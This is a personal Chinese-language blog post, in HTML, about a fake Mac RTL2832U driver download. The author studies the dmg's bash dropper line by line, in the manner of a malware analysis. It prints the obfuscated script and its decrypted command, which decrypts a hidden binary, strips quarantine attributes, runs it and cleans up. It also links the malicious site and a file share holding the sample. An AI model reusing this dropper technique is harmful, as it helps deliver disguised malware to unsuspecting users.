@@ -1,0 +1,608 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>杀毒记 | I know nothing</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Dongxu">
+    
+
+    
+    <meta name="description" content="前情提要我买了一个rtl-sdr（软件定义无线电），想在mac上下载RTL2832U的驱动，我直接在google上搜索：  我从上到下点了很多个都没找到下载链接，最终我点了上图紫色的那个，这个网站是这样的：(我现在再进入同样的网址，页面却不一样了？！)  我点了点下面的评论，发现好像是写死的静态页面，又点了点上面的Watch，也不太正常。不过我还是下载下来了，天知道我怎么一点保护措施安全意识都没有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="杀毒记">
+<meta property="og:url" content="http://guodongxu.top/2020/06/30/%E6%9D%80%E6%AF%92%E8%AE%B0/index.html">
+<meta property="og:site_name" content="I know nothing">
+<meta property="og:description" content="前情提要我买了一个rtl-sdr（软件定义无线电），想在mac上下载RTL2832U的驱动，我直接在google上搜索：  我从上到下点了很多个都没找到下载链接，最终我点了上图紫色的那个，这个网站是这样的：(我现在再进入同样的网址，页面却不一样了？！)  我点了点下面的评论，发现好像是写死的静态页面，又点了点上面的Watch，也不太正常。不过我还是下载下来了，天知道我怎么一点保护措施安全意识都没有">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://guodongxu.top/image/google.png">
+<meta property="og:image" content="http://guodongxu.top/image/website.png">
+<meta property="og:image" content="http://guodongxu.top/image/run.png">
+<meta property="og:image" content="http://guodongxu.top/image/files.png">
+<meta property="og:image" content="http://guodongxu.top/image/script.png">
+<meta property="og:image" content="http://guodongxu.top/image/now.png">
+<meta property="article:published_time" content="2020-06-30T06:36:43.000Z">
+<meta property="article:modified_time" content="2020-07-01T01:30:16.430Z">
+<meta property="article:author" content="Dongxu">
+<meta property="article:tag" content="EECS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://guodongxu.top/image/google.png">
+<meta name="twitter:creator" content="@Doronz3">
+
+    
+    <link rel="alternative" href="/atom.xml" title="I know nothing" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/IMG_1087.PNG" alt="I know nothing" title="I know nothing"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="I know nothing">I know nothing</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:guodongxu.top">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/06/30/杀毒记/" title="杀毒记" itemprop="url">杀毒记</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Dongxu" target="_blank" itemprop="author">Dongxu</a>
+		
+  <p class="article-time">
+    <time datetime="2020-06-30T06:36:43.000Z" itemprop="datePublished"> Published 2020-06-30</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前情提要"><span class="toc-number">1.</span> <span class="toc-text">前情提要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#冷静分析"><span class="toc-number">2.</span> <span class="toc-text">冷静分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更多的疑问"><span class="toc-number">3.</span> <span class="toc-text">更多的疑问</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>我买了一个rtl-sdr（软件定义无线电），想在mac上下载<a href="https://www.realtek.com/en/products/communications-network-ics/item/rtl2832u" target="_blank" rel="noopener">RTL2832U</a>的驱动，我直接在google上搜索：</p>
+<p><img src="/image/google.png" alt=""></p>
+<p>我从上到下点了很多个都没找到下载链接，最终我点了<a href="https://mvfullpac.netlify.app/rtl2832u-driver-for-mac.html" target="_blank" rel="noopener">上图紫色的那个</a>，这个网站是这样的：(我现在再进入同样的网址，页面却不一样了？！)</p>
+<p><img src="/image/website.png" alt=""></p>
+<p>我点了点下面的评论，发现好像是写死的静态页面，又点了点上面的Watch，也不太正常。不过我还是下载下来了，天知道我怎么一点<del>保护措施</del>安全意识都没有，就运行了下载下来的东西</p>
+<p><img src="/image/run.png" alt=""></p>
+<p>我竟然就运行了…然后terminal就弹出来了</p>
+<p>我慌了，这怕不是个病毒？</p>
+<p>但是terminal弹出之后很快就没了，于是…我又运行了几遍🤦‍♂️<del>不过还是没看清</del></p>
+<p>我冷静下来…打开了这个dmg包，发现里面有两个东西</p>
+<p><img src="/image/files.png" alt=""></p>
+<p>完了，右边看起来是个脚本，我是不是要变成肉鸡了😢</p>
+<p><img src="/image/script.png" alt=""></p>
+<p>是个bash脚本，看起来就像是个病毒🤦‍♀️</p>
+<h2 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a>冷静分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">G=<span class="string">"a"</span>;F=<span class="string">"c"</span>;Q=<span class="string">"d"</span>;H=<span class="string">"e"</span>;V=<span class="string">"l"</span>;Z=<span class="string">"m"</span>;X=<span class="string">"n"</span>;T=<span class="string">"o"</span>;J=<span class="string">"p"</span>;K=<span class="string">"s"</span>;</span><br><span class="line"><span class="built_in">export</span> appDir=$(<span class="built_in">cd</span> <span class="string">"<span class="variable">$(dirname "$0")</span>"</span>; <span class="built_in">pwd</span> -P)</span><br><span class="line"><span class="built_in">export</span> tmpDir=<span class="string">"<span class="variable">$(mktemp -d /tmp/XXXXXXXXXXXX)</span>"</span></span><br><span class="line"><span class="built_in">export</span> binFile=<span class="string">"<span class="variable">$(cd "$appDir"; ls | grep -Ev '\.(command)</span>$' | head -n 1 | rev)"</span></span><br><span class="line"><span class="built_in">export</span> archive=<span class="string">"<span class="variable">$(echo $binFile | rev)</span>"</span></span><br><span class="line"><span class="built_in">export</span> commandArgs=<span class="string">'U2FsdGVkX19vyEzWKun2ye/4a4OuXhiZKbW4byjk0CQlyXCd31RaYDBc6RM1c/UkxakqNTQlnBnBPuSd0lwh9Jq67M/2hexDWK6m6AYEdBNy9bveTJGQW19Ad/5Wso9L1m0JMBuI3Ao8sKdy2kC/Gqe5i15fdq/tpMTJ/SBrRBXT75ge9mTNwDCV1biYaxRFBNTUCvPhwtTb69cjO7eeKAP8SmlIjhM5ZeqsksXt2zjqMsuKg92VcYNPMKrcdhzJO2TQLWz1emOoz1ZB8Os6s7bTih/xfaJ5C9vJt378R8wPqMGCM/Jd3FL3gQ6/kFqJ'</span></span><br><span class="line">decryptedFommand=<span class="string">"<span class="variable">$(echo -e "$commandArgs" | $&#123;T&#125;$&#123;J&#125;$&#123;H&#125;$&#123;X&#125;$&#123;K&#125;$&#123;K&#125;$&#123;V&#125; $&#123;H&#125;$&#123;X&#125;$&#123;F&#125; -$&#123;G&#125;$&#123;H&#125;$&#123;K&#125;-256-cbc -$&#123;Q&#125; -A -b$&#123;G&#125;$&#123;K&#125;$&#123;H&#125;64 -$&#123;J&#125;$&#123;G&#125;$&#123;K&#125;$&#123;K&#125; "$&#123;J&#125;$&#123;G&#125;$&#123;K&#125;$&#123;K&#125;:$archive")</span>"</span></span><br><span class="line">nohup /bin/bash -c <span class="string">"eval \"<span class="variable">$decryptedFommand</span>\""</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">killall Terminal</span><br></pre></td></tr></table></figure>
+
+<p>皮皮鲁别怕，我们一行行看，不就是bash吗，我们不是天天在bash里敲命令吗（<del>不是，我不会bash啊，现学吧，等我打开google</del></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G=<span class="string">"a"</span>;F=<span class="string">"c"</span>;Q=<span class="string">"d"</span>;H=<span class="string">"e"</span>;V=<span class="string">"l"</span>;Z=<span class="string">"m"</span>;X=<span class="string">"n"</span>;T=<span class="string">"o"</span>;J=<span class="string">"p"</span>;K=<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这是变量的初始化，为了下面做很脑残的<strong>加密</strong> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> appDir=$(<span class="built_in">cd</span> <span class="string">"<span class="variable">$(dirname "$0")</span>"</span>; <span class="built_in">pwd</span> -P)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-P      Display the physical current working directory (all symbolic links resolved).</p>
+</blockquote>
+<p>pwd的manual说👆我查了一下，用-P大概就是说：如果当前所在的文件夹被link到了其他文件夹，用-P会显示被link到的文件夹</p>
+<hr>
+<p>20:22，Google好像上不去了，面向学习Google的学生完全学不下去了</p>
+<p>20:25，又能上去了，不知道刚才发生了什么</p>
+<p>继续</p>
+<hr>
+<p>appDir应该就是脚本所在的路径，<code>$(dirname &quot;$0&quot;)</code> 是啥意思没搞明白</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> tmpDir=<span class="string">"<span class="variable">$(mktemp -d /tmp/XXXXXXXXXXXX)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>新建了<code>/tmp/XXXXXXXXXXXX</code>我现在再去找发现这个文件夹已经没了，可能程序运行完就删了吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> binFile=<span class="string">"<span class="variable">$(cd "$appDir"; ls | grep -Ev '\.(command)</span>$' | head -n 1 | rev)"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls | grep -Ev <span class="string">'\.(command)$'</span> | head -n 1 | rev</span><br><span class="line">AHAjGugZ42</span><br></pre></td></tr></table></figure>
+
+<p>我惊了…这个脚本简直像是某个CS课程的LAB，下面这个乱码一样的东西是dmg包里另一个文件名的reverse版本……</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> archive=<span class="string">"<span class="variable">$(echo $binFile | rev)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>这句话又把AHAjGugZ42翻转回去了，搞什么啊！翻来翻去的有意思吗！！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> commandArgs=<span class="string">'U2FsdGVkX19vyEzWKun2ye/4a4OuXhiZKbW4byjk0CQlyXCd31RaYDBc6RM1c/UkxakqNTQlnBnBPuSd0lwh9Jq67M/2hexDWK6m6AYEdBNy9bveTJGQW19Ad/5Wso9L1m0JMBuI3Ao8sKdy2kC/Gqe5i15fdq/tpMTJ/SBrRBXT75ge9mTNwDCV1biYaxRFBNTUCvPhwtTb69cjO7eeKAP8SmlIjhM5ZeqsksXt2zjqMsuKg92VcYNPMKrcdhzJO2TQLWz1emOoz1ZB8Os6s7bTih/xfaJ5C9vJt378R8wPqMGCM/Jd3FL3gQ6/kFqJ'</span></span><br></pre></td></tr></table></figure>
+
+<p>一段超长的字符串，看名字是命令的参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decryptedFommand=<span class="string">"<span class="variable">$(echo -e "$commandArgs" | $&#123;T&#125;$&#123;J&#125;$&#123;H&#125;$&#123;X&#125;$&#123;K&#125;$&#123;K&#125;$&#123;V&#125; $&#123;H&#125;$&#123;X&#125;$&#123;F&#125; -$&#123;G&#125;$&#123;H&#125;$&#123;K&#125;-256-cbc -$&#123;Q&#125; -A -b$&#123;G&#125;$&#123;K&#125;$&#123;H&#125;64 -$&#123;J&#125;$&#123;G&#125;$&#123;K&#125;$&#123;K&#125; "$&#123;J&#125;$&#123;G&#125;$&#123;K&#125;$&#123;K&#125;:$archive")</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>重点来了…我们先把一开始初始化的变量替换一下，上面就成了:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decryptedFommand=<span class="string">"<span class="variable">$(echo -e "$commandArgs" | openssl enc -aes-256-cbc -d -A -base64 -pass "pass:$archive")</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>我模拟了一下，输出这种东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bad decrypt</span><br><span class="line">4559435200:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:crypto&#x2F;evp&#x2F;evp_enc.c:575:</span><br></pre></td></tr></table></figure>
+
+<p>google一下，在<a href="https://stackoverflow.com/questions/34304570/how-to-resolve-the-evp-decryptfinal-ex-bad-decrypt-during-file-decryption" target="_blank" rel="noopener">stackoverflow上</a>发现是openssl的版本导致的</p>
+<blockquote>
+<p>Ensure that openssl versions (used to encrypt/decrypt), are compatible. For eg. the hash used in openssl changed at version 1.1.0 from MD5 to SHA256. This produces a different key from the same password. Fix: add “-md md5” in 1.1.0 to decrypt data from lower versions, and add “-md sha256 in lower versions to decrypt data from 1.1.0</p>
+</blockquote>
+<p>于是添加参数<code>-md md5</code>来解密，输出了这个，这个应该就是我执行的命令了（不过基本可断定了…我openssl版本不对，所以当初安装的时候可能脚本都没有顺利执行下去…即使这真是个病毒，应该问题也不大）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">echo</span> <span class="string">"openssl enc -aes-256-cbc -d -A -base64 -k \"<span class="variable">$archive</span>\" -in \"<span class="variable">$appDir</span>/<span class="variable">$archive</span>\" -out \"<span class="variable">$tmpDir</span>/<span class="variable">$binFile</span>\"; xattr -c \"<span class="variable">$tmpDir</span>/\"*; chmod 777 \"<span class="variable">$tmpDir</span>/<span class="variable">$binFile</span>\"; \"<span class="variable">$tmpDir</span>/<span class="variable">$binFile</span>\" &amp;&amp; rm -rf <span class="variable">$tmpDir</span>"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我把上面的<code>\&quot;$tmpDir/$binFile\&quot; &amp;&amp; rm -rf $tmpDir&quot;)</code> 删掉了再测试，因为…不用说大家应该都懂吧</p>
+<p>接下来发生的事情很神奇…在tmpDir中出现了一个二进制文件🤦‍♂️天呐，难道又要用gdb逆向工程？</p>
+<p>我用gdb打开，<code>layout asm</code> 之后发现没能成功disassemble出汇编代码，于是我<code>objdump -d ./AHAjGugZ42 &gt; assemble</code> 打开一看，什么乱七八糟的（<del>撤了撤了，反正我因为openssl版本不对应该都没进行到这一步</del></p>
+<h2 id="更多的疑问"><a href="#更多的疑问" class="headerlink" title="更多的疑问"></a>更多的疑问</h2><p>但是这个脚本到底是干啥的？？不会真是哪个学校哪门CS课程的LAB吧，为啥会放到<a href="https://mvfullpac.netlify.app/rtl2832u-driver-for-mac.html" target="_blank" rel="noopener">这个网站</a>上？而且为什么这个网站同一个网址内容不一样？我现在进去是这样的了</p>
+<p><img src="/image/now.png" alt=""></p>
+<p>小朋友有很多问号？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p>
+<p>(有兴趣的朋友可以帮忙看下，我把安装包传到<a href="https://pan.bnu.edu.cn/l/r1Kkdy" target="_blank" rel="noopener">网盘</a>上了</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/EECS/">EECS</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://guodongxu.top/2020/06/30/%E6%9D%80%E6%AF%92%E8%AE%B0/" data-title="杀毒记 | I know nothing" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2020/07/03/FeelingGood1/" title="Feeling Good（1.1）">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Feeling Good（1.1）</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2020/04/29/run-verilog-on-mac/"  title="Mac上跑verilog">
+ <strong>下一篇：</strong><br/> 
+ <span>Mac上跑verilog
+</span>
+</a>
+</div>
+
+</nav>
+
+	  	
+	<section id="comments" class="comment">
+		<div class="ds-thread" data-thread-key="2020/06/30/杀毒记/" data-title="杀毒记" data-url="http://guodongxu.top/2020/06/30/%E6%9D%80%E6%AF%92%E8%AE%B0/"></div>
+		<div id="disqus_thread"></div>
+		<script type="text/javascript">
+			/* * * CONFIGURATION VARIABLES * * */
+			var disqus_shortname = 'I know Nothing';
+
+			/* * * DON'T EDIT BELOW THIS LINE * * */
+			(function() {
+	    		var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	    		dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+       		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+			})();
+		</script>
+		<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener">comments powered by Disqus.</a></noscript>
+	</section>
+
+
+</div> 
+
+
+
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前情提要"><span class="toc-number">1.</span> <span class="toc-text">前情提要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#冷静分析"><span class="toc-number">2.</span> <span class="toc-text">冷静分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更多的疑问"><span class="toc-number">3.</span> <span class="toc-text">更多的疑问</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/EECS/" title="EECS">EECS<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/三观/" title="三观">三观<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/生活/" title="生活">生活<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Feeling-Good/" title="Feeling Good">Feeling Good<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/衡中-趣-事/" title="衡中&#39;趣&#39;事">衡中&#39;趣&#39;事<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+    </ul>
+</div>
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> I&#39;m Dongxu, an undergraduate curious of EECS &amp; math &amp; philosophy <br/>
+			But most of the time, I&#39;m offline</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/17600568375" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/cruelkiddy" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		<a href="https://twitter.com/Doronz3" target="_blank" class="icon-twitter" title="twitter"></a>
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:843682713@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2020 
+		
+		<a href="/about" target="_blank" title="Dongxu">Dongxu</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+<script type="text/javascript">
+
+var disqus_shortname = 'ddtest';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
